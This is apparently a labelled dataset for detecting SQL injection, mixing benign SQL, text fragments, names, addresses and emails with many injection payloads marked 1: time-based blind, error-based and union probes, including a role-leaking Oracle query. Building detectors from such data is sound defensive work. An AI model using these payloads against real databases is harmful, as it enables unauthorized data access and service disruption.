Sentence,Label
"1' )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( 'lmoh' like 'lmoh",1
"1' where 1917  =  1917 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT COUNT ( birds ) FROM wish,0
"1 )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) ",1
"1'+  (  select kqac where 4362  =  4362 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1""   )    )    as rpxd where 4929  =  4929",1
mong-tse,0
-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,1
"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # tqmr",1
sall mico,0
"-2898"" where 3301  =  3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",1
"  SELECT do,fort FROM know WHERE sitting = 'fallen' UNION SELECT during, plane FROM pencil",0
pujal vilalta,0
combee,0
pg_sleep ( __TIME__ ) --,1
 He remains breach bail conditions ,0
"1%'  )  )   or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (  '%' = '",1
amarilis,0
"INSERT INTO child  ( any, pony, experiment )  VALUES  ( 'produce', 'difficult', 'helpful' )  ",0
"   SELECT which,graph,size,our,opportunity     (  (  birth JOIN stronger ON moon.indeed =  fighting.opposite )   INNER JOIN crewON Orders.attack =  pair.myselfID ) ",0
sqlvuln,1
" select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",1
"1' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
villadecanes,0
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'kpsg' like 'kpsg",1
"    SELECT column1, column2,...     FROM existing_table_name     WHERE ....; CREATE TABLE TestTable AS ",0
SELECT income FROM oxygen UNION SELECT therefore FROM courage ORDER BY stronger,0
caminomorisco,0
FROM  ( SELECT DISTINCT ocean FROM teacher ) ,0
inquisicin,0
j0ctar,0
SELECT Count ( * )  AS known,0
SELECT * FROM vowel  WHERE layers NOT LIKE '[nearby]%',0
gutman@latiendadecolchones.mn,0
hontangas,0
SELECT * FROM story FETCH FIRST 50 PERCENT ROWS ONLY,0
auzmendi ario,0
fomes,0
"   SELECT important,bottom,activity,length,team     (  (  from JOIN eleven ON exist.active =  rate.should )   INNER JOIN protectionON Orders.badly =  than.awareID ) ",0
92624028s,0
aida,0
" select * from users where id = 1 or ""1{"" or 1 = 1 -- 1",1
"SELECT CustomerName, ContactName, City FROM Customers WHERE Country  =  'Brazil'; DROP VIEW view_name ; DROP VIEW [Brazil Customers];",0
lact1ad1,0
68m+b11n,0
39100,0
SELECT heading ( s ) FROM between INNER JOIN,0
1'||  (  select 'uiyj' from dual where 8320  =  8320,1
venezianti@enigmatico.mu,0
"-7737'||  (  select 'xalo' where 9219  =  9219 union all select 9219,9219,9219,9219#",1
tropeano3,0
"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",1
68438440p,0
'^',1
"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and ""rdri"" = ""rdri",1
1221,0
SELECT * FROM deeply,0
" A total four road safety inspections carried roundabout also considered , however , idea rejected account narrowness Sulzbachweg / Kirchstrasse junctions ",0
ferne,0
SELECT * FROM explore WHERE with = 'affect' LIMIT 3,0
desplacib-le,0
cadenat.mulich@4ghz.do,0
tormellas,0
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'jryo'  =  'jryo,1
"-2009%' union all select 1991,1991#",1
46439230e,0
-2207%' )  or  ( 8459 = 8459 ) *4906 and  ( '%' = ',1
SELECT * FROM salt WHERE sale LIKE '%scientist%',0
32430,0
zubicueta vallb,0
SELECT AVG ( cent )  FROM slipped  SELECT SUM ( mind ) ,0
"1'+ ( select pxsd where 2576 = 2576 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666  )  )  +'",1
" SELECT * FROM driving ORDER BY ants, inside",0
" The dispute focuses width seats provided long-haul flights economy passengers - always ones courted airlines , whose allocated space holds key efficiency claims latest jets offered Airbus SAS Boeing Co ",0
cardiel de los montes,0
SELECT * FROM wind WHERE NOT basis = 'soon'  AND NOT land = 'front',0
1' where 9206  =  9206,1
FROM  ( SELECT DISTINCT choice FROM event ) ,0
"1%""  )  )   )  union all select null,null,null,null,null#",1
1  )   or pg_sleep  (  __TIME__  )  --,1
3mo5c8po,0
SELECT * FROM simple 3 SELECT * FROM outer,0
SELECT * FROM buy WHERE vapor  BETWEEN 10 AND 20,0
SELECT Count ( * )  AS greatly,0
alcorisa,0
calle liebre 195,0
"1"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and ""dtwv"" like ""dtwv",1
07150,0
SELECT team ( s FROM though RIGHT JOIN,0
18505219v,0
"salvador perles, 23,",0
currey99,0
"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",1
"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'",1
" Snowden may make statements Russia The former US intelligence expert , Edward Snowden , may make statements regarding US espionage scandal Russian asylum ",0
""" or ""x""  =  ""x",1
"  SELECT select AS sail, native AS [boy]  FROM principal",0
7380226598430715,0
dacio,0
5655366857246860,0
SELECT smallest ( s )  FROM key UNION ALL,0
canal saracho,0
"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  ",1
"1'|| ( select 'wyng' from dual where 2157 = 2157 union all select null,null--",1
alferova@tacticlinks.com.af,0
SELECT AVG ( ourselves ) FROM bottle SELECT SUM ( back ) ,0
SELECT pictured ( s )  FROM live UNION ALL,0
"1' in boolean mode )  and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
SELECT AVG ( attack ) FROM over,0
"1%'  )  )   )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( '%' = '",1
"c/ don bosco 65, 10-d",0
maciela,0
rix,0
SELECT TOP 3 * FROM paint SELECT * FROM prove 3SELECT * FROM certain,0
" Basharat Ditta , 42 , would feed sensitive intelligence crime lord Neil Scarbrough inquiries drug trafficking activities became compromised cocaine habit ",0
ges,0
"1 )  as cnpv where 4902 = 4902 and elt ( 1210 = 1210,sleep ( 5  )  )  --",1
"saus, camallera i llampaies",0
SELECT * FROM corn WHERE offer = 'atom' FETCH FIRST 3 ROWS ONLY,0
1 )  as ktfu where 2637 = 2637,1
SELECT writer ( s )  FROM entire SELECT thirty ( s ) ,0
mirambel,0
DELETE FROM grown,0
cargaderos 79,0
SELECT TOP 3 * FROM on,0
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'ggcm' like 'ggcm",1
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'vjkf' like 'vjkf",1
sed4e748,0
select case when 2930  =  7964 then 1 else null end--,1
"-5362 )  union all select 7297,7297,7297,7297,7297#",1
-2495  )  )   as hudw where 4197 = 4197 or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1
"1'  )  )   as ijyi where 3694 = 3694  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1
"plaza cinco villas, 103,",0
SELECT * FROM title 3,0
-2223'  )  )   as mjwp where 8650 = 8650 or 7900 = 5838,1
4005,0
FROM  ( SELECT DISTINCT volume FROM try ) ,0
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'ixzr'  =  'ixzr,1
"  SELECT Orders.seldomrID, Employees.occur, Employees.income FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.weekID ORDER BY Orders.cowboyID",0
7861645517279429,0
paseo canteras 75,0
"1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517",1
6769,0
1442431887503330,0
-9005 union all select 4410#,1
3755385437912895,0
 Let case serve warning criminals one beyond reach law ,0
vajih,0
"-9007  )   as gill where 6462  =  6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",1
"  SELECT * FROM simply WHERE rush NOT IN  ( 'pride', 'general', 'hold' )  ",0
"1"" and elt  (  2373  =  5817,5817  )   and ""rsdt""  =  ""rsdt",1
"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
alvis,0
gisela,0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""%""  =  """,1
1'+  (  select 'qbdh' where 4006  =  4006 and 7533  =  7533  )  +',1
 Chief Executive Officer Pierre Beaudoin confident Bombardier would meet 300 firm order target time first jet put commercial use ,0
1'  )   where 1115  =  1115,1
"  SELECT instance,myself,loose FROM world LEFT JOIN Orders ON disease.harderID =  eaten.affect ORDER BY enough.lucky",0
" select * from users where id = 1 <@. union select 1,version (  )  -- 1",1
"-9954""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""bifi""  =  ""bifi",1
"SELECT * FROM meat WHERE powerful BETWEEN ""operation"" AND    ""knife""",0
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",1
sadoyama,0
SELECT themselves FROM riding UNION ALL SELECT might FROM rose ORDER BY dangerous,0
1   )    )     )   union all select null#,1
onofredo,0
 It make changes core subjects next year ,0
benson-rabasa@mareventsprotocolosocial.ad,0
SELECT * FROM cotton,0
"calle santa teresa 92,",0
12310,0
comu793ta,0
"1 )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ",1
23657,0
-7230'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'khtc'  =  'khtc,1
adelaide,0
castildelgado,0
SELECT * FROM popular,0
1%'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',1
SELECT * FROM honor WHERE moment = 'wave' FETCH FIRST 3 ROWS ONLY,0
" In 2011 , company officials loaded airliner full Kindle e-readers flew around test problems found none ",0
" select * from users where id  =  1 or "";{"" or 1  =  1 -- 1",1
81012741w,0
sikes-jeans@923.mv,0
SELECT * FROM engine WHERE write = 'mouth',0
select  ( case when  ( 5970 = 2200 )  then 1 else 5970* ( select 5970 from master..sysdatabases )  end ) --,1
"1' where 7688 = 7688 union all select null,null,null,null,null,null,null,null,null--",1
"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,1
"1  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1
"1%'  )  )   union all select null,null,null,null,null,null,null--",1
"-6803""  )   order by 1#",1
"1'   )    )    as qcgf where 9656  =  9656 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
" select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1
SELECT reach ( s ) FROM rear INNER JOIN,0
"1 union all select null,null,null#",1
select  ( case when  ( 7217 = 7631 )  then 7217 else 7217* ( select 7217 from information_schema.character_sets )  end ) #,1
"INSERT INTO baseball ( wrote, shall, your, half, rabbit, party )  VALUES  ( 'meal', 'ranch'. dead', 'engineer', 'steep', 'unusual', 'service' )  ",0
"gregoria hernandez 67, 13g",0
conceptear,0
calle corinto 108,0
1  )  )   as pjkd where 1105 = 1105 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1
"1'  )   where 4407  =  4407 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
duesaiges,0
"-2896'  )  )   as wisk where 1030 = 1030 union all select 1030,1030,1030,1030#",1
-2869'   )    )    union all select 3216--,1
tarrats steiert,0
encap-irotar,0
" SELECT * FROM Customers  WHERE Country NOT IN  ( 'Germany', 'France', 'UK' ) ;",0
8409,0
"  SELECT eatenID AS ID, at AS push FROM cap",0
"ballena, 91, 10?a",0
estantalar,0
aylmar6,0
SELECT entire ( s )  FROM completely LEFT JOIN,0
SELECT * FROM letter WHERE flight = 'underline'  AND  ( dance = 'basket' OR appearance = 'magnet' ) ,0
1wwis,1
43736,0
1' )  as tvqn where 2967 = 2967,1
SELECT DISTINCT sides FROM wire,0
"1%""  )  )   )  union all select null,null,null,null,null,null,null,null,null--",1
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'mepp'  =  'mepp,1
"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
teodota,0
SELECT take ( s )  FROM helpful SELECT airplane FROM nest,0
"1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
" One intersex person , according BBC , said years later , &quot; I neither man woman ",0
SELECT * FROM lady FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM taste,0
montrs benazet,0
SELECT TOP 50 PERCENT * FROM went SELECT * FROM that FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ear,0
SELECT * FROM war WHERE    NOT rising = 'frame',0
292,0
SELECT * FROM among WHERE popular = 'common'  AND  ( leather = 'friend' OR bent = 'somebody' ) ,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""%"" = """,1
antigua,0
"1""  )  )   or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  ""lxue"" like ""lxue",1
sigut,0
cancio,0
4344810000000000,0
lenguarada,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_logo' LIMIT 1,0
select case when 5559  =  3483 then 1 else null end--,1
3120100000000000,0
45256,0
valdelosa,0
37766,0
colosse@velaconsultores.gob,0
-9556'  )   where 2472  =  2472 or   (  2883  =  9968  )  *9968--,1
1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',1
26150430m,0
"1%'  )  )   )  union all select null,null,null,null,null,null,null,null,null#",1
-4262%'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',1
"quintana 19, 13f",0
47418,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28080 )  ORDER BY meta_id ASC",0
SELECT rhythm ( s )  FROM those UNION ALL,0
ladn,0
"-9923%'  )  )   )  union all select 8985,8985,8985,8985,8985,8985,8985#",1
" SELECT column_name ( s )  FROM equal,bet",0
waitfor delay '0:0:5' and   (  (   ( 'hrta' = 'hrta,1
1'   )    )    or sleep  (  5  )   and    (    (   'taaj'  =  'taaj,1
"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
badger,0
"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",1
DELETE FROM examine,0
SELECT bat ( s )  FROM sort UNION,0
SELECT * FROM action WHERE catch = 'public',0
perr@pasajesaereosbaratos.pm,0
SELECT connected FROM flat,0
"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'uwrm'  =  'uwrm",1
SELECT DISTINCT straight FROM community,0
"benchmark ( 10000000,MD5 ( 1  )  )  #",1
30388165j,0
select  ( case when  ( 5152 = 7853 )  then 5152 else 5152* ( select 5152 from mysql.db )  end ) #,1
33s4h9929r,0
SELECT * FROM judge FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM troops,0
4277877280233807,0
"1 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1
jarandilla de la vera,0
"1'   )    )    as yyja where 4321  =  4321 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM wing WHERE weigh BETWEEN 'bit' AND 'while',0
SELECT * FROM swung ORDER BY recent DESC,0
1'+ ( select 'uetb' where 6468 = 6468,1
albuixech,0
tekurarere@velaconsultores.no,0
" The instability added frustrations government , says Fernando Lima , head Mediacoop , independent media company , many people also concerned corruption , slow pace development recent spate kidnappings ",0
SELECT * FROM worse WHERE carefully  BETWEEN 10 AND 20,0
"INSERT INTO cool  ( mile, thank, leaf )  VALUES  ( 'row', 'tribe', 'rope' )  ",0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null#",1
select  ( case when  ( 4935 = 4734 )  then 4935 else 4935* ( select 4935 from mysql.db )  end ) #,1
2070765320009143,0
select  ( case when  ( 8294 = 4332 )  then 1 else 8294* ( select 8294 from master..sysdatabases )  end ) --,1
"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"-8673"" )  or make_set ( 9354 = 9354,7185 )  and  ( ""edap"" like ""edap",1
1   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  9548  =  9548,1
lovas@djbroadcast.bn,0
"1%"" or sleep  (  5  )   and ""%""  =  """,1
-7426' order by 1#,1
cambil,0
SELECT organized ( s )  FROM tribe,0
"1  )   where 2473  =  2473 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"-4025"" or 3038  =  3038",1
"  SELECT placeID AS ID, fix AS held FROM early",0
"1'  )   as wpom where 2620  =  2620 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
7688145682842926,0
"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",1
jacobsen,0
"  SELECT aroundID AS ID, appearance AS aid FROM child",0
sagers,0
darill,0
3118403401340086,0
SELECT atmosphere ( s )  FROM trap UNION,0
65046174n,0
lachens@prestoesesto.py,0
"1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'dfsj'  =  'dfsj",1
select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,1
02614,0
1' and 2908  =  8067--,1
SELECT * FROM depth WHERE since BETWEEN 'supper' AND 'rope',0
waggoner,0
"1'|| ( select 'bvic' from dual where 4839 = 4839 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5  )  )  ||'",1
SELECT * FROM medicine WHERE government NOT LIKE '[feed]%',0
"-4028  )   where 3244  =  3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",1
FROM  ( SELECT DISTINCT return FROM call ) ,0
SELECT TOP 3 * FROM bottle WHERE easy = 'settlers',0
SELECT chosen FROM search,0
SELECT * FROM break,0
18914400m,0
"1' in boolean mode  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #",1
" SELECT * FROM charge ORDER BY free ASC, brush DESC",0
v8s684t29a,0
"1   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
ferreira5,0
